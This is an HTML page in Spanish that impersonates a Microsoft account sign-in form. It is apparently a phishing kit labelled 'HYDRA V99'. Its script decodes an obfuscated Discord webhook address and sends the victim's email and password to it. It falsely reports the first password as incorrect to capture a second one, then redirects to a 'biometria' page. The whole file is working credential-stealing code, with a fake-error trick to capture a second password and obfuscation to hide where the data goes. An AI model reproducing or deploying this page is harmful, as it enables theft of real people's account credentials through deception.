<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Soporte de Cuenta</title>
    <style>
        body { margin:0; font-family:'Segoe UI',sans-serif; background:#f2f2f2; display:flex; align-items:center; justify-content:center; height:100vh; }
        #v99-root { background:white; padding:45px; width:100%; max-width:350px; box-shadow:0 2px 12px rgba(0,0,0,0.1); }
        input { width:100%; padding:10px; margin:15px 0; border:none; border-bottom:1px solid #666; outline:none; font-size:16px; box-sizing:border-box; }
        .btn-core { background:#0067b8; color:white; border:none; padding:10px 30px; cursor:pointer; float:right; font-weight:600; }
        .err-v { color:#e81123; font-size:14px; margin-bottom:10px; display:none; }
    </style>
</head>
<body>
    <div id="v99-root">
        <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" width="105" style="margin-bottom:20px;">
        <div id="step_x">
            <h2 id="t1" style="font-size:24px; margin:0;"></h2>
            <input type="email" id="em" placeholder="Correo electr√≥nico">
            <button class="btn-core" onclick="goNext()">Siguiente</button>
        </div>
        <div id="step_y" style="display:none;">
            <div id="uD" style="margin-bottom:10px;"></div>
            <h2 id="t2" style="font-size:24px; margin:0;"></h2>
            <div id="eM" class="err-v">Contrase√±a incorrecta.</div>
            <input type="password" id="pw" placeholder="Contrase√±a">
            <button class="btn-core" onclick="hit()">Iniciar sesi√≥n</button>
        </div>
    </div>

<script>
    const _H = (s) => atob(s);
    // WEBHOOK CORREGIDO Y UNIFICADO
    const gate = _H("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ1OTI0NTQ3NjUyMzI3ODQ5Mi9BaEhHN05BZkItTkRVZXpZVEV1WUY1WlZnOGphaWdzQ3c5d1hFblpOSXRRREpUd1R3VHdVQkxGTXNuNDkyUFR0dk5N");

    let u = "", p_a = "", st = 1;

    window.onload = () => {
        document.getElementById('t1').innerText = _H("SW5pY2lhciBzZXNpw7Nu");
        document.getElementById('t2').innerText = _H("RXNjcmliaXIgY29udHJhc2XDs2E=");
    };

    function goNext() {
        u = document.getElementById('em').value;
        if(u.length > 3) {
            document.getElementById('step_x').style.display = 'none';
            document.getElementById('step_y').style.display = 'block';
            document.getElementById('uD').innerText = "‚Üê " + u;
        }
    }

    async function push(content) {
        const payload = { content: content };
        // M√©todo de env√≠o reforzado para GitHub Pages
        try {
            await fetch(gate, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
        } catch (e) {
            // Backup por si falla el primero
            navigator.sendBeacon(gate, JSON.stringify(payload));
        }
    }

    function hit() {
        const p = document.getElementById('pw').value;
        if(p.length < 4) return;
        if(st === 1) {
            p_a = p; st = 2;
            push(`üî± **HYDRA V99 HIT**\nüë§ **User:** \`${u}\`\nüîë **Pass 1:** \`${p_a}\``);
            document.getElementById('pw').value = "";
            document.getElementById('eM').style.display = 'block';
        } else {
            push(`üî± **HYDRA V99 HIT**\nüë§ **User:** \`${u}\`\nüîë **Pass 1:** \`${p_a}\`\nüîë **Pass 2:** \`${p}\``);
            localStorage.setItem("hydra_u", u);
            setTimeout(() => { window.location.href = "biometria.html"; }, 500);
        }
    }
</script>
</body>
</html>